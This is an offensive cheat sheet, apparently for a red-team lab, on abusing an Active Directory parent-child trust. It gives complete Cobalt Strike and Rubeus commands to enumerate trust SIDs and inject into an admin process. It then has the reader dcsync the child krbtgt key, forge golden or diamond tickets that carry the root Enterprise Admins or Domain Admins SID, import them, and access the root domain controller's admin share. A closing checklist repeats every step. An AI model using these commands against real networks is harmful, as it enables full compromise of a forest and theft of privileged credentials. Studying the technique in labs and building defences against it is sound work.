---
title: "Parent-Child Trusts · SID History and Tickets"
description: "Enumerate an intra-forest trust, distinguish child and root SIDs, and follow the lab Golden Ticket flow and the Diamond Ticket alternative."
category: "Forest & Domain Trusts"
tools: ["Cobalt Strike", "Rubeus", "PowerShell"]
updated: "2026-11-11"
tags: ["ad", "trusts", "forest", "kerberos", "sid-history"]
draft: false
---

## 1. Parent-child trust and the forest boundary

Parent-child trusts are automatically created, bidirectional and transitive within a forest. An administrative compromise of a child domain can therefore put the forest root at risk: domains in one forest are not independent security boundaries against malicious domain administrators.

The example starts in `dublin.contoso.com` and targets the forest root `contoso.com`. It requires replication rights in the child to obtain that child's `krbtgt` key. Trust metadata alone grants neither replication rights nor access to the root DC.

SID History normally preserves access during account migration. The ticket technique here places a privileged root-domain group SID in the PAC's additional SIDs. It does not edit an account's directory `sIDHistory` attribute.

| Value | Meaning in this example |
|---|---|
| `trustDirection: 3` | Bidirectional relationship |
| `trustAttributes` containing `32` | `WITHIN_FOREST` |
| Child domain SID | Base SID for the forged child-domain identity |
| Root domain SID + `-519` | Enterprise Admins in the forest root |
| Root domain SID + `-512` | Domain Admins in the root domain |
| Child `krbtgt` AES256 key | Key required by the ticket examples |

These intra-forest examples cannot simply be transferred to a cross-forest trust with SID filtering.

## 2. Enumerate trust metadata and SIDs

Run in Beacon in the child domain. `ldapsearch` requires the LDAP extension used by the exercise.

```shell
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
# Example: 3 | contoso.com | 32 | CONTOSO

# Child SID: use this as /sid in the Golden Ticket command
ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
# Example: S-1-5-21-690277740-3036021016-2883941857

# Read the actual Enterprise Admins group SID from the root
ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
# Example: S-1-5-21-3926355307-1661546229-813047887-519

# Root domain SID, if needed for other group RIDs
ldapsearch (objectClass=domain) --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com --attributes objectSid
```

`--dn` specifies the search base. `/sid` takes a **domain SID**, whereas `/sids` takes complete additional **principal SIDs**. Do not swap them.

## 3. Child-domain replication context

The lab starts from `DUB-WKSTN-3` and identifies a process running with child-domain administrative access. If that context is already available, use it directly. Otherwise the lab obtains a new Beacon through process injection:

```shell
# In the original elevated Beacon, identify the current process and owner
ps

# Optional lab context transition: use the real PID and configured listener
inject <CHILD_DA_PID> x64 http
# Select the NEW Beacon when it connects; do not repeat injection as a separate step

# In the context that actually has child-domain replication rights
getuid
dcsync dublin.contoso.com DUBLIN\krbtgt
# Retain aes256_hmac as <CHILD_KRBTGT_AES256>
```

The process PID is session-specific. A tasking message does not prove the new Beacon connected or that replication is authorized. The relevant key belongs to `DUBLIN\krbtgt`, rather than the root's `krbtgt` or an inter-realm trust account.

## 4. Golden Ticket: Enterprise Admins SID

This path creates a child-domain TGT offline with the root Enterprise Admins SID included as an additional SID. Run on the **operator's machine**:

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:<CHILD_KRBTGT_AES256> /outfile:C:\Users\Attacker\Desktop\golden
# Record the exact generated file path printed by Rubeus
```

| Argument | Purpose |
|---|---|
| `/user` | Represented child-domain account |
| `/domain` | Child domain |
| `/sid` | Child domain SID |
| `/sids` | Full root Enterprise Admins SID in this example |
| `/aes256` | Child `krbtgt` AES256 key |
| `/outfile` | Output path/prefix; use the actual resulting filename |

Ticket acceptance also depends on the target environment's validation and hardening. A locally generated file alone does not establish successful authentication.

## 5. Diamond Ticket alternative: root Domain Admins SID

This alternative starts with a legitimate TGT and modifies its authorization data using the child `krbtgt` key. It is a separate path, not a step after Golden Ticket creation.

```shell
# Run in the child-domain Beacon with a suitable current user context
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:<CHILD_KRBTGT_AES256> /nowrap
# Retain the complete returned ticket as <DIAMOND_BASE64>
```

`/tgtdeleg` obtains a usable TGT for the current context; `/ticketuser` and `/ticketuserid` describe the represented identity. `/krbkey` is the child `krbtgt` key. This example adds root **Domain Admins (`512`)**, while the Golden Ticket example adds **Enterprise Admins (`519`)**.

Convert the returned ticket in **local PowerShell**:

```powershell
[IO.File]::WriteAllBytes('C:\Users\Attacker\Desktop\diamond.kirbi', [Convert]::FromBase64String('<DIAMOND_BASE64>'))
```

Reference for arguments: [Rubeus command definitions](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Domain/Info.cs).

## 6. Import, validate and restore the test context

Use the file created by the selected path. A separate network-only session avoids importing into the original user's ticket cache.

```shell
make_token DUBLIN\Administrator FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\<GENERATED_TICKET_FILE>
run klist
# Expected client: Administrator @ DUBLIN.CONTOSO.COM
# Expected TGT: krbtgt/dublin.contoso.com

ls \\lon-dc-1.contoso.com\c$
# The lab validates access to this root-domain administrative share

# Only purge the selected test session
kerberos_ticket_purge
rev2self
```

The cached TGT remains a child-domain TGT. The remote access result validates the tested resource; it does not prove that every forest-wide action will succeed. If an extra Beacon was created for the exercise, end that test Beacon separately rather than killing its unrelated host process.

## 7. Troubleshooting

| Symptom | What to check |
|---|---|
| Replication fails | Effective rights in the child domain |
| Ticket generation fails | Child key, child domain SID, complete additional SID and tool arguments |
| Root access fails | Ticket validation, selected session, correct root SID, DNS and policy |
| Wrong identity in `klist` | Session selection and exact imported file |
| A cross-forest adaptation fails | Different trust boundary and SID filtering rules |

## 8. Quick checklist

```text
TRUST AND IDENTIFIERS
[ ] ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
[ ] Confirm the same-forest relationship: bidirectional and WITHIN_FOREST
[ ] ldapsearch (objectClass=domain) --hostname <CHILD_DC> --dn <CHILD_DN> --attributes objectSid
[ ] ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname <ROOT_DC> --dn <ROOT_DN> --attributes objectSid

CHILD REPLICATION CONTEXT
[ ] getuid → confirm the context with child-domain replication rights
[ ] Optional lab transition: ps, then inject <CHILD_DA_PID> x64 <LISTENER>; select the new Beacon
[ ] dcsync <CHILD_DOMAIN> <CHILD_NETBIOS>\krbtgt
[ ] Retain the child krbtgt AES256 key; do not substitute a trust key

TICKET — CHOOSE ONE PATH
[ ] Local operator: Rubeus.exe golden /user:Administrator /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /sids:<ROOT_SID>-519 /aes256:<CHILD_KRBTGT_AES256> /outfile:C:\path\golden
[ ] Record the exact output filename
[ ] Diamond alternative in Beacon: execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:<ROOT_SID>-512 /krbkey:<CHILD_KRBTGT_AES256> /nowrap
[ ] For Base64 output, local PowerShell: [IO.File]::WriteAllBytes('C:\path\diamond.kirbi', [Convert]::FromBase64String('<DIAMOND_BASE64>'))

IMPORT AND VERIFY
[ ] make_token <CHILD_NETBIOS>\Administrator FakePass
[ ] kerberos_ticket_use C:\path\<ACTUAL_TICKET_FILE>
[ ] run klist → confirm the child-domain client and TGT
[ ] ls \\<ROOT_DC_FQDN>\c$ → verify the lab's target resource
[ ] kerberos_ticket_purge → only the selected test cache
[ ] rev2self
```

## Related references

- [Inter-realm tickets and trust fundamentals](/cheatsheets/inter-realm-tickets-cheatsheet/)
- [Inbound trusts](/cheatsheets/inbound-trust-cheatsheet/)
- [Outbound trusts](/cheatsheets/outbound-trust-cheatsheet/)
- [Pass the Ticket](/cheatsheets/pass-the-ticket-cobalt-cheatsheet/)
